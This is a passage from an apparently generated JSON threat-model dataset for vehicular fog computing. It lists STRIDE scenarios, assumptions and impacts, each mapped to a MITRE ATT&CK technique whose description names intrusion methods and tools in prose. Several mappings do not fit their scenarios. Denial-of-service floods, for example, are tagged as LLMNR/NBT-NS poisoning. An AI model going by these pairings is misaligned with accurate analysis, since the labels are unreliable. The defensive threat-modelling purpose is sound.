newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
                "technique_id": "T1080"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies transmitting false data packets between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "No secure logging mechanism for data transmissions.",
                    "Role": "System Designer",
                    "Condition": "Valid if logs are not securely stored or tampered with."
                },
                {
                    "Assumption": "Attackers can forge transmission logs.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers possess log alteration tools."
                },
                {
                    "Assumption": "The system lacks or has weak non-repudiation protocols in place.",
                    "Role": "System Designer",
                    "Condition": "Valid if non-repudiation mechanisms are missing or weak."
                }
            ],
            "Potential Impact": "System cannot trace malicious activities, impacting law enforcement and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log forging",
                "network",
                "data packets"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Modification or deletion of event logs on fog nodes by an attacker to conceal unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not backed up or stored in a tamper-evident manner.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs are not replicated or protected."
                },
                {
                    "Assumption": "Fog nodes have vulnerabilities that the attacker can exploit to access logs.",
                    "Role": "Attacker",
                    "Condition": "Valid if the fog nodes are inadequately protected."
                },
                {
                    "Assumption": "There is no integrity verification for log files.",
                    "Role": "System Designer",
                    "Condition": "Valid if logs lack checksums or cryptographic integrity checks."
                }
            ],
            "Potential Impact": "Compromises the system's ability to detect and respond to security breaches.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "repudiation",
                "event logs",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Linux Audit System",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
                "id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
                "technique_id": "T1562.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates data sent to the cloud, then denies such actions.",
            "Assumptions": [
                {
                    "Assumption": "There is no secure logging of data transmissions between fog nodes and the cloud.",
                    "Role": "System Designer",
                    "Condition": "Valid if log mechanisms are not robust to tampering."
                },
                {
                    "Assumption": "The attacker can manipulate data without detection.",
                    "Role": "Attacker",
                    "Condition": "Valid if the system does not monitor data integrity effectively."
                },
                {
                    "Assumption": "The system does not maintain a robust audit trail.",
                    "Role": "System Designer",
                    "Condition": "Valid if there is poor audit trail design or maintenance."
                }
            ],
            "Potential Impact": "Affects forensic analysis and trouble identification post-breach.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "audit trail",
                "repudiation",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker captures sensitive data in Edge-Fog data flows.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption is poorly implemented or not used."
                },
                {
                    "Assumption": "The attacker can intercept communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if capable of man-in-the-middle or similar attacks."
                },
                {
                    "Assumption": "Sensitive data is transmitted without adequate obfuscation.",
                    "Role": "System Designer",
                    "Condition": "Valid if no data masking or obfuscation is performed."
                }
            ],
            "Potential Impact": "Leads to unauthorized disclosure of sensitive vehicle and infrastructure data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "network",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Accessing sensitive data stored on fog nodes by unauthorized personnel.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are weak or poorly enforced on fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access control policies are not stringent or enforced."
                },
                {
                    "Assumption": "Data at rest is not encrypted on fog nodes.",
                    "Role": "System Designer",
                    "Condition": "Valid if no encryption measures are in place for stored data."
                },
                {
                    "Assumption": "Attackers have physical or network access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if fog nodes are not physically or virtually secured."
                }
            ],
            "Potential Impact": "Results in loss of confidentiality and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "unauthorized access",
                "information disclosure",
                "data at rest",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leakage of sensitive data during Fog-Cloud data transfers.",
            "Assumptions": [
                {
                    "Assumption": "Data is transferred in plaintext or weakly encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if strong encryption standards are not followed."
                },
                {
                    "Assumption": "Attackers can monitor and intercept data transmissions.",
                    "Role": "Attacker",
                    "Condition": "Valid if capable of eavesdropping on network traffic."
                },
                {
                    "Assumption": "There is no monitoring or alerting mechanism for suspicious data access.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the system lacks proper monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, impacting system confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "information disclosure",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding fog nodes with excessive data to overwhelm processing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have limits on data processing capacity.",
                    "Role": "System Designer",
                    "Condition": "Valid if nodes are not designed to handle peak loads effectively."
                },
                {
                    "Assumption": "There are no rate limiting or anti-flooding mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if traffic management measures are inadequate."
                },
                {
                    "Assumption": "Attacker has the means to generate large data volumes.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has the resources to create significant traffic."
                }
            ],
            "Potential Impact": "Disrupts the availability of local processing and decision-making, impacting real-time operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flood",
                "fog node",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targeting communication channels between fog nodes and the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels have bandwidth limits.",
                    "Role": "System Designer",
                    "Condition": "Valid if channel capacities are limited or vulnerable."
                },
                {
                    "Assumption": "No robust DDoS mitigation techniques implemented.",
                    "Role": "System Administrator",
                    "Condition": "Valid if DDoS detection and prevention mechanisms are lacking."
                },
                {
                    "Assumption": "Attacker can control multiple devices or nodes to launch DDoS.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has a botnet or similar capabilities."
                }
            ],
            "Potential Impact": "Hampers data flow integrity and availability, significantly impacting cloud-related functionalities.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "communication channel",
                "denial of service",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DoS attack against RSUs to disrupt real-time traffic management.",
            "Assumptions": [
                {
                    "Assumption": "RSUs lack redundancy and failover mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if RSUs are single points of failure."
                },
                {
                    "Assumption": "There are no protective measures against DoS in RSUs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if protective measures are weak or non-existent."
                },
                {
                    "Assumption": "An attacker can initiate sufficient traffic to perform DoS.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has resources to generate significant traffic."
                }
            ],
            "Potential Impact": "Interrupts the flow of traffic information, severely affecting real-time traffic management and vehicle safety.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic management",
                "RSU",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a vulnerability in fog node software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Fog node software contains exploitable vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Valid if vulnerabilities are unpatched or unknown."
                },
                {
                    "Assumption": "The attacker can deliver payloads to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has a vector to deliver exploits."
                },
                {
                    "Assumption": "Privilege escalation protections are absent or inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Valid if privilege management controls are weak."
                }
            ],
            "Potential Impact": "Causes system integrity compromise and unauthorized control over fog node operations.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "fog node",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider abuses their access to gain higher privileges within the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not enforce strict role-based access control (RBAC).",
                    "Role": "System Administrator",
                    "Condition": "Valid if RBAC is poorly implemented or missing."
                },
                {
                    "Assumption": "Insider has legitimate access to the system.",
                    "Role": "Insider",
                    "Condition": "Valid if the insider is an employee or partner with initial access."
                },
                {
                    "Assumption": "Privileges are not monitored or audited regularly.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there are no active monitoring or auditing practices."
                }
            ],
            "Potential Impact": "Leads to unauthorized actions and potential data breaches or system manipulation.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege abuse",
                "cloud services",
                "access control"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Abuse of remote management interfaces on roadside units (RSUs) to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Remote management interfaces are accessible to attackers.",
                    "Role": "System Designer",
                    "Condition": "Valid if interfaces are exposed or poorly secured."
                },
                {
                    "Assumption": "RSUs do not enforce multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "Valid if MFA is not implemented or enforced."
                },
                {
                    "Assumption": "Attacker knows or can guess default or weak credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if default credentials are unchanged or weakly stored."
                }
            ],
            "Potential Impact": "Results in unauthorized remote control of RSUs, impacting data integrity and operational commands.",
            "MITRE ATT&CK Keywords": [
                "remote access",
                "privilege escalation",
                "RSU",
                "management interface"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle to inject false data into the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a vehicle's communication interface.",
                    "Role": "Attacker",
                    "Condition": "Access to vehicle's communication interface is possible."
                },
                {
                    "Assumption": "The communication protocol between smart vehicles and fog nodes lacks strong authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Unauthorized data injection leading to data corruption and potential traffic mishandling.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "vehicle",
                "network",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a fog node to impersonate a legitimate roadside unit (RSU).",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deploy a rogue device near the roadway.",
                    "Role": "Attacker",
                    "Condition": "Physical access to road infrastructure is possible."
